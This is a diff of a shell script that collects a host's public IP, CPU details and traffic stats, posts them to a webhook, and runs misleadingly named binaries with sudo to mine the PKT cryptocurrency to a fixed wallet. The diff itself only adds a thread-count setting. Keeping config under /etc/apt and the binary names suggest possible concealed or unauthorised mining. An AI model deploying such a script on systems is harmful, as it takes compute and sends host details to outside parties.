@@ -6,6 +6,7 @@ sudo systemctl enable vnstat.service
 export  oracle_user=`cat /etc/apt/oracle_user.txt | sed -n "$1"P`
 ip=`curl ifconfig.me`
 jumlah_vcpu=`cat /proc/cpuinfo | grep processor | wc -l`
+jumlah_vcpu_minus_1=$(($jumlah_vcpu - 1))
 jenis_cpu=`uname -m`
 how_long_uptime=`uptime | awk '{print $3}'`
 daily_average=`sudo vnstat --oneline |  awk '{print $4}' | awk -F";" '{ print $NF }'`
@@ -37,8 +38,8 @@ curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}
 
 if [ "$jenis_cpu" == "aarch64" ]; then
 sleep 8
-sudo ./xcore_xmr_arm ann -p pkt1qlug4yrrlxe0rh8l4ry56mpgsmnh8a797wjqd8f http://pool.srizbi.com  http://pool.pktpool.io http://pool.pkt.world http://pool.pktpool.io
+sudo ./xcore_xmr_arm ann -t $jumlah_vcpu_minus_1 -p pkt1qlug4yrrlxe0rh8l4ry56mpgsmnh8a797wjqd8f http://pool.srizbi.com  http://pool.pktpool.io http://pool.pkt.world http://pool.pktpool.io
 else
 sleep 8
-sudo ./xcore_xmr_amd ann -p pkt1qlug4yrrlxe0rh8l4ry56mpgsmnh8a797wjqd8f http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world.io http://pool.pktpool.io
+sudo ./xcore_xmr_amd ann -t $jumlah_vcpu_minus_1 -p pkt1qlug4yrrlxe0rh8l4ry56mpgsmnh8a797wjqd8f http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world.io http://pool.pktpool.io
 fi
